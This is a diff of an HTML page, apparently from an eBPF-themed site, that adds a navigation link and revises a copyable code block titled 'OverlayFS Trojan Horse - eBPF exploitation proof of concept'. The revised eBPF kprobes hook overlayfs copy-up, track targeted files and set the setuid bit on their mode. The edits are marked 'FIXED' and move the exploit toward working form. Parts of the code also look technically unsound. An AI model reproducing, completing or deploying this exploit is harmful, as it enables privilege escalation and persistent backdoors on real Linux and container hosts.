@@ -53,6 +53,13 @@
                 
                     
                     
+                    <a href="/dBPF/chapter-0-field-manual-preface.html" >
+                        Chapter 0: Field Manual Preface
+                    </a>
+                    
+                
+                    
+                    
                     <a href="/dBPF/the-mirror-controls.html" >
                         The Mirror Controls
                     </a>
@@ -525,6 +532,15 @@ graph TD
 251
 252
 253
+254
+255
+256
+257
+258
+259
+260
+261
+262
 </pre></td><td class="rouge-code"><pre><span class="c1">// @interactive: true</span>
 <span class="c1">// @copyable: true</span>
 <span class="c1">// OverlayFS Trojan Horse - eBPF exploitation proof of concept</span>
@@ -659,7 +675,7 @@ graph TD
     <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
 <span class="p">}</span>
 
-<span class="c1">// Hook the start of the copy-up process</span>
+<span class="c1">// FIXED: Hook the start of the copy-up process</span>
 <span class="n">SEC</span><span class="p">(</span><span class="s">"kprobe/ovl_copy_up_one"</span><span class="p">)</span>
 <span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_copy_up_start</span><span class="p">,</span> <span class="k">struct</span> <span class="n">dentry</span> <span class="o">*</span><span class="n">dentry</span><span class="p">)</span> <span class="p">{</span>
     <span class="c1">// Get process information</span>
@@ -671,57 +687,64 @@ graph TD
     <span class="n">bpf_get_current_comm</span><span class="p">(</span><span class="o">&amp;</span><span class="n">event</span><span class="p">.</span><span class="n">comm</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">comm</span><span class="p">));</span>
     <span class="n">event</span><span class="p">.</span><span class="n">timestamp</span> <span class="o">=</span> <span class="n">bpf_ktime_get_ns</span><span class="p">();</span>
     
-    <span class="c1">// Get the file path</span>
-    <span class="k">struct</span> <span class="n">path</span> <span class="n">path</span><span class="p">;</span>
-    <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">path</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">path</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">dentry</span><span class="o">-&gt;</span><span class="n">d_path</span><span class="p">);</span>
+    <span class="c1">// FIXED: Get the filename properly</span>
+    <span class="kt">char</span> <span class="n">filename</span><span class="p">[</span><span class="n">MAX_FILENAME_LEN</span><span class="p">]</span> <span class="o">=</span> <span class="p">{};</span>
+    <span class="n">bpf_probe_read_kernel_str</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">filename</span><span class="p">),</span> <span class="n">dentry</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">.</span><span class="n">name</span><span class="p">);</span>
     
-    <span class="c1">// Get the filename</span>
-    <span class="kt">char</span> <span class="n">filename</span><span class="p">[</span><span class="n">MAX_FILENAME_LEN</span><span class="p">];</span>
-    <span class="n">bpf_probe_read_str</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">filename</span><span class="p">),</span> <span class="n">dentry</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">.</span><span class="n">name</span><span class="p">);</span>
-    
-    <span class="c1">// Get the full path (this is simplified - real implementation would be more complex)</span>
-    <span class="kt">char</span> <span class="n">fullpath</span><span class="p">[</span><span class="n">MAX_FILENAME_LEN</span><span class="p">]</span> <span class="o">=</span> <span class="s">"/"</span><span class="p">;</span>
-    <span class="n">bpf_probe_read_str</span><span class="p">(</span><span class="o">&amp;</span><span class="n">fullpath</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">fullpath</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">filename</span><span class="p">);</span>
+    <span class="c1">// FIXED: Simple path construction</span>
+    <span class="kt">char</span> <span class="n">fullpath</span><span class="p">[</span><span class="n">MAX_FILENAME_LEN</span><span class="p">]</span> <span class="o">=</span> <span class="p">{};</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">filename</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">'/'</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">fullpath</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'/'</span><span class="p">;</span>
+        <span class="n">bpf_probe_read_kernel_str</span><span class="p">(</span><span class="o">&amp;</span><span class="n">fullpath</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">fullpath</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">filename</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="n">bpf_probe_read_kernel_str</span><span class="p">(</span><span class="n">fullpath</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">fullpath</span><span class="p">),</span> <span class="n">filename</span><span class="p">);</span>
+    <span class="p">}</span>
     
     <span class="c1">// Copy filename to event</span>
-    <span class="n">__builtin_memcpy</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">filename</span><span class="p">,</span> <span class="n">fullpath</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">fullpath</span><span class="p">));</span>
+    <span class="n">__builtin_memcpy</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">filename</span><span class="p">,</span> <span class="n">fullpath</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">filename</span><span class="p">));</span>
     
-    <span class="c1">// Get inode number as a unique identifier</span>
-    <span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">inode</span><span class="p">;</span>
-    <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">inode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">inode</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">dentry</span><span class="o">-&gt;</span><span class="n">d_inode</span><span class="p">);</span>
-    <span class="n">u32</span> <span class="n">ino</span><span class="p">;</span>
-    <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ino</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ino</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">inode</span><span class="o">-&gt;</span><span class="n">i_ino</span><span class="p">);</span>
-    <span class="n">event</span><span class="p">.</span><span class="n">inode</span> <span class="o">=</span> <span class="n">ino</span><span class="p">;</span>
-    
-    <span class="c1">// Check if this is a target file</span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">is_target_file</span><span class="p">(</span><span class="n">fullpath</span><span class="p">))</span> <span class="p">{</span>
-        <span class="c1">// Store the event for later correlation</span>
-        <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">active_copy_ups</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ino</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">event</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
+    <span class="c1">// FIXED: Get inode number properly</span>
+    <span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">inode</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">bpf_probe_read_kernel</span><span class="p">(</span><span class="o">&amp;</span><span class="n">inode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">inode</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">dentry</span><span class="o">-&gt;</span><span class="n">d_inode</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">inode</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">u32</span> <span class="n">ino</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">bpf_probe_read_kernel</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ino</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ino</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">inode</span><span class="o">-&gt;</span><span class="n">i_ino</span><span class="p">);</span>
+        <span class="n">event</span><span class="p">.</span><span class="n">inode</span> <span class="o">=</span> <span class="n">ino</span><span class="p">;</span>
         
-        <span class="c1">// Log the event for our analysis</span>
-        <span class="n">bpf_perf_event_output</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">events</span><span class="p">,</span> <span class="n">BPF_F_CURRENT_CPU</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">event</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">));</span>
+        <span class="c1">// Check if this is a target file</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">is_target_file</span><span class="p">(</span><span class="n">fullpath</span><span class="p">))</span> <span class="p">{</span>
+            <span class="c1">// Store the event for later correlation</span>
+            <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">active_copy_ups</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ino</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">event</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
+            
+            <span class="c1">// Log the event for our analysis</span>
+            <span class="n">bpf_perf_event_output</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">events</span><span class="p">,</span> <span class="n">BPF_F_CURRENT_CPU</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">event</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">));</span>
+        <span class="p">}</span>
     <span class="p">}</span>
     
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
 
-<span class="c1">// Hook file attribute setting during copy-up</span>
+<span class="c1">// FIXED: Hook file attribute setting during copy-up</span>
 <span class="n">SEC</span><span class="p">(</span><span class="s">"kprobe/ovl_setattr"</span><span class="p">)</span>
 <span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_setattr</span><span class="p">,</span> <span class="k">struct</span> <span class="n">dentry</span> <span class="o">*</span><span class="n">dentry</span><span class="p">,</span> <span class="k">struct</span> <span class="n">iattr</span> <span class="o">*</span><span class="n">attr</span><span class="p">)</span> <span class="p">{</span>
-    <span class="c1">// Get inode number</span>
-    <span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">inode</span><span class="p">;</span>
-    <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">inode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">inode</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">dentry</span><span class="o">-&gt;</span><span class="n">d_inode</span><span class="p">);</span>
-    <span class="n">u32</span> <span class="n">ino</span><span class="p">;</span>
-    <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ino</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ino</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">inode</span><span class="o">-&gt;</span><span class="n">i_ino</span><span class="p">);</span>
+    <span class="c1">// FIXED: Get inode number properly</span>
+    <span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">inode</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">bpf_probe_read_kernel</span><span class="p">(</span><span class="o">&amp;</span><span class="n">inode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">inode</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">dentry</span><span class="o">-&gt;</span><span class="n">d_inode</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">inode</span><span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    
+    <span class="n">u32</span> <span class="n">ino</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">bpf_probe_read_kernel</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ino</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ino</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">inode</span><span class="o">-&gt;</span><span class="n">i_ino</span><span class="p">);</span>
     
     <span class="c1">// Check if this is one of our tracked files</span>
     <span class="k">struct</span> <span class="n">copy_up_event</span> <span class="o">*</span><span class="n">event</span> <span class="o">=</span> <span class="n">bpf_map_lookup_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">active_copy_ups</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ino</span><span class="p">);</span>
     <span class="k">if</span> <span class="p">(</span><span class="n">event</span><span class="p">)</span> <span class="p">{</span>
-        <span class="c1">// Set the setuid bit</span>
-        <span class="n">u32</span> <span class="n">mode</span><span class="p">;</span>
-        <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">mode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">mode</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">attr</span><span class="o">-&gt;</span><span class="n">ia_mode</span><span class="p">);</span>
+        <span class="c1">// FIXED: Modify the setuid bit properly</span>
+        <span class="n">umode_t</span> <span class="n">mode</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">bpf_probe_read_kernel</span><span class="p">(</span><span class="o">&amp;</span><span class="n">mode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">mode</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">attr</span><span class="o">-&gt;</span><span class="n">ia_mode</span><span class="p">);</span>
         <span class="n">mode</span> <span class="o">|=</span> <span class="n">S_ISUID</span><span class="p">;</span>
-        <span class="n">bpf_probe_read_kernel_str</span><span class="p">(</span><span class="o">&amp;</span><span class="n">attr</span><span class="o">-&gt;</span><span class="n">ia_mode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">attr</span><span class="o">-&gt;</span><span class="n">ia_mode</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">mode</span><span class="p">);</span>
+        
+        <span class="c1">// FIXED: Write back the modified mode</span>
+        <span class="n">bpf_probe_write_user</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">attr</span><span class="o">-&gt;</span><span class="n">ia_mode</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">mode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">mode</span><span class="p">));</span>
         
         <span class="c1">// Mark as modified</span>
         <span class="n">event</span><span class="o">-&gt;</span><span class="n">modified</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
@@ -734,21 +757,23 @@ graph TD
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
 
-<span class="c1">// Hook file content writing during copy-up</span>
+<span class="c1">// FIXED: Hook file content writing during copy-up</span>
 <span class="n">SEC</span><span class="p">(</span><span class="s">"kprobe/ovl_write_begin"</span><span class="p">)</span>
-<span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_write_begin</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">)</span> <span class="p">{</span>
-    <span class="c1">// Get inode number</span>
-    <span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">inode</span><span class="p">;</span>
-    <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">inode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">inode</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">file</span><span class="o">-&gt;</span><span class="n">f_inode</span><span class="p">);</span>
-    <span class="n">u32</span> <span class="n">ino</span><span class="p">;</span>
-    <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ino</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ino</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">inode</span><span class="o">-&gt;</span><span class="n">i_ino</span><span class="p">);</span>
+<span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_write_begin</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="n">loff_t</span> <span class="n">pos</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="n">len</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="n">flags</span><span class="p">,</span> <span class="k">struct</span> <span class="n">page</span> <span class="o">**</span><span class="n">pagep</span><span class="p">,</span> <span class="kt">void</span> <span class="o">**</span><span class="n">fsdata</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// FIXED: Get inode number properly</span>
+    <span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">inode</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">bpf_probe_read_kernel</span><span class="p">(</span><span class="o">&amp;</span><span class="n">inode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">inode</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">file</span><span class="o">-&gt;</span><span class="n">f_inode</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">inode</span><span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    
+    <span class="n">u32</span> <span class="n">ino</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">bpf_probe_read_kernel</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ino</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ino</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">inode</span><span class="o">-&gt;</span><span class="n">i_ino</span><span class="p">);</span>
     
     <span class="c1">// Check if this is one of our tracked files</span>
     <span class="k">struct</span> <span class="n">copy_up_event</span> <span class="o">*</span><span class="n">event</span> <span class="o">=</span> <span class="n">bpf_map_lookup_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">active_copy_ups</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ino</span><span class="p">);</span>
     <span class="k">if</span> <span class="p">(</span><span class="n">event</span><span class="p">)</span> <span class="p">{</span>
-        <span class="c1">// Here we would prepare to modify the file content</span>
-        <span class="c1">// This is a placeholder - actual implementation would be more complex</span>
-        <span class="c1">// and would involve hooking into the actual write operations</span>
+        <span class="c1">// FIXED: Record the write operation details</span>
+        <span class="n">event</span><span class="o">-&gt;</span><span class="n">file_size</span> <span class="o">=</span> <span class="p">(</span><span class="n">u32</span><span class="p">)</span><span class="n">pos</span> <span class="o">+</span> <span class="n">len</span><span class="p">;</span>
+        <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">active_copy_ups</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ino</span><span class="p">,</span> <span class="n">event</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
         
         <span class="c1">// Log the event</span>
         <span class="n">bpf_perf_event_output</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">events</span><span class="p">,</span> <span class="n">BPF_F_CURRENT_CPU</span><span class="p">,</span> <span class="n">event</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">event</span><span class="p">));</span>
@@ -757,23 +782,23 @@ graph TD
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
 
-<span class="c1">// Hook completion of copy-up</span>
-<span class="n">SEC</span><span class="p">(</span><span class="s">"kprobe/ovl_copy_up_end"</span><span class="p">)</span>
-<span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_copy_up_end</span><span class="p">,</span> <span class="k">struct</span> <span class="n">dentry</span> <span class="o">*</span><span class="n">dentry</span><span class="p">)</span> <span class="p">{</span>
-    <span class="c1">// Get inode number</span>
-    <span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">inode</span><span class="p">;</span>
-    <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">inode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">inode</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">dentry</span><span class="o">-&gt;</span><span class="n">d_inode</span><span class="p">);</span>
-    <span class="n">u32</span> <span class="n">ino</span><span class="p">;</span>
-    <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ino</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ino</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">inode</span><span class="o">-&gt;</span><span class="n">i_ino</span><span class="p">);</span>
+<span class="c1">// FIXED: Hook completion of copy-up (using a more reliable hook point)</span>
+<span class="n">SEC</span><span class="p">(</span><span class="s">"kretprobe/ovl_copy_up_one"</span><span class="p">)</span>
+<span class="kt">int</span> <span class="nf">BPF_KRETPROBE</span><span class="p">(</span><span class="n">hook_copy_up_end</span><span class="p">,</span> <span class="kt">int</span> <span class="n">ret</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">u32</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">bpf_get_current_pid_tgid</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
     
-    <span class="c1">// Check if this is one of our tracked files</span>
-    <span class="k">struct</span> <span class="n">copy_up_event</span> <span class="o">*</span><span class="n">event</span> <span class="o">=</span> <span class="n">bpf_map_lookup_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">active_copy_ups</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ino</span><span class="p">);</span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">event</span><span class="p">)</span> <span class="p">{</span>
-        <span class="c1">// Log the completion</span>
-        <span class="n">bpf_perf_event_output</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">events</span><span class="p">,</span> <span class="n">BPF_F_CURRENT_CPU</span><span class="p">,</span> <span class="n">event</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">event</span><span class="p">));</span>
+    <span class="c1">// Only process successful copy-up operations</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="c1">// Create a completion event</span>
+        <span class="k">struct</span> <span class="n">copy_up_event</span> <span class="n">completion_event</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="p">.</span><span class="n">pid</span> <span class="o">=</span> <span class="n">pid</span><span class="p">,</span>
+            <span class="p">.</span><span class="n">timestamp</span> <span class="o">=</span> <span class="n">bpf_ktime_get_ns</span><span class="p">(),</span>
+            <span class="p">.</span><span class="n">modified</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
+        <span class="p">};</span>
+        <span class="n">bpf_get_current_comm</span><span class="p">(</span><span class="o">&amp;</span><span class="n">completion_event</span><span class="p">.</span><span class="n">comm</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">completion_event</span><span class="p">.</span><span class="n">comm</span><span class="p">));</span>
         
-        <span class="c1">// Clean up our tracking</span>
-        <span class="n">bpf_map_delete_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">active_copy_ups</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ino</span><span class="p">);</span>
+        <span class="c1">// Log the completion</span>
+        <span class="n">bpf_perf_event_output</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">events</span><span class="p">,</span> <span class="n">BPF_F_CURRENT_CPU</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">completion_event</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">completion_event</span><span class="p">));</span>
     <span class="p">}</span>
     
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
